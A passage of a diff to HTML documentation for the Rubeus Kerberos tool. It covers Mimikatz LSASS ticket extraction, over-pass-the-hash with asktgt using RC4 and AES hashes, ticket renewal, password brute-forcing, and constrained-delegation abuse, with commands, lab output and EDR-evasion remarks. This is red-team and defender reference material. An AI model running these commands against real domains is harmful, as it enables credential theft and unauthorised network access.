+<p>Mimikatz is the swiss army knife of credential extraction, with multiple options. The <code v-pre>sekurlsa::logonpasswords</code> command will open up a <a href="https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L168" class="outbound" target="_blank"><span>read handle to LSASS</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, enumerate logon sessions present on the system, walk the default authentication packages for each logon session, and extract any reverseable password/credential material present. <strong>Sidenote</strong>: the <code v-pre>sekurlsa::ekeys</code> command will enumerate ALL key types present for the Kerberos package.</p>
+<p>Rubeus doesn&#x27;t have any code to touch LSASS (and none is intended), so its functionality is limited to extracting Kerberos tickets through use of the LsaCallAuthenticationPackage() API. From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so only service tickets extracted will be usable (the <strong>tgtdeleg</strong> command uses a Kekeo trick to get a usable TGT for the current user). If in a high-integrity context, a <a href="https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/Helpers.cs#L55-L107" class="outbound" target="_blank"><span>GetSystem</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> equivalent utilizing token duplication is run to elevate to SYSTEM, and a fake logon application is registered with the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi&#x27;s being output for later reuse.</p>
 <p>Mimikatz can perform the same base64 .kirbi extraction with the following series of commands:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">mimikatz # privilege::debug
+<pre translate="no" class="language-none"><code v-pre class="language-none">mimikatz # privilege::debug
 mimikatz # token::elevate
 mimikatz # standard::base64 /output:true
 mimikatz # kerberos::list /export</code></pre>
 </doc-codeblock></div>
 <p>Mimikatz can also carve tickets directly out of LSASS&#x27; memory with:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">mimikatz # privilege::debug
+<pre translate="no" class="language-none"><code v-pre class="language-none">mimikatz # privilege::debug
 mimikatz # standard::base64 /output:true
 mimikatz # sekurlsa::tickets /export</code></pre>
 </doc-codeblock></div>
@@ -541,9 +542,9 @@ mimikatz # sekurlsa::tickets /export</code></pre>
     </h4>
 </doc-anchor-target>
 <p>Say we recover a user&#x27;s rc4_hmac hash (NTLM) and want to reuse this credential to compromise an additional machine where the user account has privileged access.</p>
-<p><strong>Sidenote:</strong> pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn&#x27;t touch Kerberos at all. The over-pass-the-hash approach was developed by <a href="https://twitter.com/gentilkiwi" class="outbound" target="_blank"><span>Benjamin Delpy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> and <a href="https://twitter.com/passingthehash" class="outbound" target="_blank"><span>Skip Duckwall</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> (see their <a href="https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18" class="outbound" target="_blank"><span>&quot;Abusing Microsoft Kerberos - Sorry you guys don&#x27;t get it&quot;</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> presentation for more information). This approach turns a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).</p>
-<p>Let&#x27;s compare &quot;over-passing-the-hash&quot; via Mimikatz&#x27; <code v-pre>sekurlsa::pth</code> command verus using the <code v-pre>asktgt</code> command from Rubeus (or <a href="https://github.com/gentilkiwi/kekeo/" class="outbound" target="_blank"><span>Kekeo</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> if you&#x27;d like).</p>
-<p>When <code v-pre>sekurlsa::pth</code> is used to over-pass-the-hash, Mimikatz first creates a new <a href="https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L926" class="outbound" target="_blank"><span>logon type 9 process</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> with dummy credentials - this creates a new &quot;sacrificial&quot; logon session that doesn&#x27;t interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then <a href="https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600" class="outbound" target="_blank"><span>patched into the appropriate section</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> for the associated logon session (in this case, the &quot;sacrificial&quot; logon session that was started). This causes the normal Kerberos authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.</p>
+<p><strong>Sidenote:</strong> pass-the-hash != over-pass-the-hash. The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn&#x27;t touch Kerberos at all. The over-pass-the-hash approach was developed by <a href="https://twitter.com/gentilkiwi" class="outbound" target="_blank"><span>Benjamin Delpy</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> and <a href="https://twitter.com/passingthehash" class="outbound" target="_blank"><span>Skip Duckwall</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> (see their <a href="https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18" class="outbound" target="_blank"><span>&quot;Abusing Microsoft Kerberos - Sorry you guys don&#x27;t get it&quot;</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> presentation for more information). This approach turns a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a fully-fledged ticket-granting-ticket (TGT).</p>
+<p>Let&#x27;s compare &quot;over-passing-the-hash&quot; via Mimikatz&#x27; <code v-pre>sekurlsa::pth</code> command verus using the <code v-pre>asktgt</code> command from Rubeus (or <a href="https://github.com/gentilkiwi/kekeo/" class="outbound" target="_blank"><span>Kekeo</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> if you&#x27;d like).</p>
+<p>When <code v-pre>sekurlsa::pth</code> is used to over-pass-the-hash, Mimikatz first creates a new <a href="https://github.com/gentilkiwi/mimikatz/blob/3d8be22fff9f7222f9590aa007629e18300cf643/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L926" class="outbound" target="_blank"><span>logon type 9 process</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> with dummy credentials - this creates a new &quot;sacrificial&quot; logon session that doesn&#x27;t interact with the current logon session. It then opens the LSASS process with the ability to write to process memory, and the supplied hash/key is then <a href="https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c#L566-L600" class="outbound" target="_blank"><span>patched into the appropriate section</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> for the associated logon session (in this case, the &quot;sacrificial&quot; logon session that was started). This causes the normal Kerberos authentication process to kick off as normal as if the user had normally logged on, turning the supplied hash into a fully-fledged TGT.</p>
 <p>When Rubeus&#x27; <code v-pre>asktgt</code> command is run (or Kekeo&#x27;s equivalent), the raw Kerberos protocol is used to request a TGT, which is then applied to the current logon session if the <code v-pre>/ptt</code> flag is passed.</p>
 <p>With the Mimikatz approach, administrative rights are needed as you are manipulating LSASS memory directly. As previously mentioned, Mimikatz&#x27; popularity has also led to this type of behavior (opening up a handle to LSASS and reading/writing its memory) being a big target for EDR detection and/or prevention. With the Rubeus/Kekeo approach, administrative rights are not needed as LSASS is not being touched. However, if the ticket is applied to the current logon session (with <code v-pre>/ptt</code>), the TGT for the current logon session will be overwritten. This behavior can be avoided (with administrative access) by using the <code v-pre>/createnetonly</code> command to create a sacrificial process/logon session, then using <code v-pre>/ptt /ticket:X /luid:0xa..</code> with the newly created process LUID. If using Cobalt Strike, using the <strong>make_token</strong> command with dummy credentials and then <strong>kerberos_ticket_use</strong> with the ticket retrieved by Rubeus will let you apply the new TGT in a way that a) doesn&#x27;t need administrative rights and b) doesn&#x27;t stomp on the current logon session TGT.</p>
 <p>It is our opinion that the LSASS manipulation approach is more likely (at the current moment) to be detected or mitigated due to the popularity of the technique. However the Rubeus approach does result in another piece of detectable behavior. Kerberos traffic to port 88 should normally only originate from lsass.exe - sending raw traffic of this type from an abnormal process could be detectable if the information can be gathered.</p>
@@ -594,7 +595,7 @@ mimikatz # sekurlsa::tickets /export</code></pre>
 <p>By default, several differences exists between AS-REQ&#x27;s generated by Rubeus and genuine AS-REQ&#x27;s. To form AS-REQ&#x27;s more inline with genuine requests, the <code v-pre>/opsec</code> flag can be used, this will send an initial AS-REQ without pre-authentication first, if this succeeds, the resulting AS-REP is decrypted and TGT return, otherwise an AS-REQ with pre-authentication is then sent. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than <code v-pre>aes256</code> and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used with the <code v-pre>/opsec</code> changes, the <code v-pre>/force</code> flag exists.</p>
 <p>Requesting a ticket via RC4 hash for <strong><a href="mailto:dfm.a@testlab.local">dfm.a@testlab.local</a></strong>, applying it to the current logon session:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
 
  ______        _
 (_____ \      | |
@@ -656,7 +657,7 @@ Base64(key)           :  +zY8adXi2NuvkAxl1ohUOA==</code></pre>
 </doc-codeblock></div>
 <p>Requesting a ticket via aes256_hmac hash for <strong><a href="mailto:dfm.a@testlab.local">dfm.a@testlab.local</a></strong>, starting a new hidden process and applying the ticket to that logon session. <strong>Note: elevation needed!</strong></p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /domain:testlab.local /aes256:e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27 /createnetonly:C:\Windows\System32\cmd.exe
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /domain:testlab.local /aes256:e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27 /createnetonly:C:\Windows\System32\cmd.exe
 
  ______        _
 (_____ \      | |
@@ -707,7 +708,7 @@ v1.3.3
 <p>To play with other scenarios manually, <code v-pre>/tgs:X</code> can be used to supply an additional ticket which is appended to the request body. This also adds the constrained delegation KDC option as well as avoids dynamically determining the domain from the given SPN <code v-pre>/service:X</code>, for this reason the <code v-pre>/usesvcdomain</code> flag has been implemented to force the request to use the domain from the given SPN <code v-pre>/service:X</code> which is useful for requesting delegated service tickets from a foreign domain.</p>
 <p>Requesting a TGT for dfm.a and then using that ticket to request a service ticket for the &quot;LDAP/primary.testlab.local&quot; and &quot;cifs/primary.testlab.local&quot; SPNs:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe
 
  ______        _
 (_____ \      | |
@@ -801,7 +802,7 @@ v1.3.3
 </doc-codeblock></div>
 <p>Requesting a service ticket for an AES-enabled service account, specifying that we <em>only</em> support RC4_HMAC:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asktgs /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip).../service:roast/me /enctype:rc4
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe asktgs /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip).../service:roast/me /enctype:rc4
 
  ______        _
 (_____ \      | |
@@ -844,7 +845,7 @@ Base64(key)           :  Gg3zZicIl5c50KGecCf8XA==</code></pre>
 <p>The <strong>renew</strong> action will build/parse a raw TGS-REQ/TGS-REP TGT renewal exchange using the specified <code v-pre>/ticket:X</code> supplied. This value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk. If a <code v-pre>/dc</code> is not specified, the computer&#x27;s current domain controller is extracted and used as the destination for the renewal traffic. The <code v-pre>/ptt</code> flag will &quot;pass-the-ticket&quot; and apply the resulting Kerberos credential to the current logon session.</p>
 <p>Note that TGTs MUST be renewed before their EndTime, within the RenewTill window.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe renew /ticket:ticket.kirbi /ptt
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe renew /ticket:ticket.kirbi /ptt
 
  ______        _
 (_____ \      | |
@@ -872,7 +873,7 @@ v1.3.3
 </doc-codeblock></div>
 <p>The <code v-pre>/autorenew</code> flag will take an existing <code v-pre>/ticket:X</code> .kirbi file/blob, sleep until endTime-30 minutes, auto-renew the ticket and display the refreshed ticket blob. It will continue this renewal process until the allowable renew-till renewal window passes.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe renew /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip)... /autorenew
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe renew /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip)... /autorenew
 
    ______        _
   (_____ \      | |
@@ -912,7 +913,7 @@ v1.3.3
 </doc-anchor-target>
 <p>The <strong>brute</strong> action will perform a Kerberos-based password bruteforcing attack.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe brute /password:Password123!! /noticket
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe brute /password:Password123!! /noticket
 
    ______        _
   (_____ \      | |
@@ -961,12 +962,12 @@ v1.3.3
         <span>s4u</span>
     </h3>
 </doc-anchor-target>
-<p>The <strong>s4u</strong> action is nearly identical to <a href="https://github.com/gentilkiwi/kekeo/" class="outbound" target="_blank"><span>Kekeo</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s <strong>tgs::s4u</strong> functionality. If a user (or computer) account is configured for constrained delegation (i.e. has a SPN value in its msds-allowedtodelegateto field) this action can be used to abuse access to the target SPN/server. Constrained delegation is complex. For more information see <a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" class="outbound" target="_blank"><span>this post</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> or Elad Shamir&#x27;s <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" class="outbound" target="_blank"><span>&quot;Wagging the Dog&quot;</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> post.</p>
+<p>The <strong>s4u</strong> action is nearly identical to <a href="https://github.com/gentilkiwi/kekeo/" class="outbound" target="_blank"><span>Kekeo</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s <strong>tgs::s4u</strong> functionality. If a user (or computer) account is configured for constrained delegation (i.e. has a SPN value in its msds-allowedtodelegateto field) this action can be used to abuse access to the target SPN/server. Constrained delegation is complex. For more information see <a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" class="outbound" target="_blank"><span>this post</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 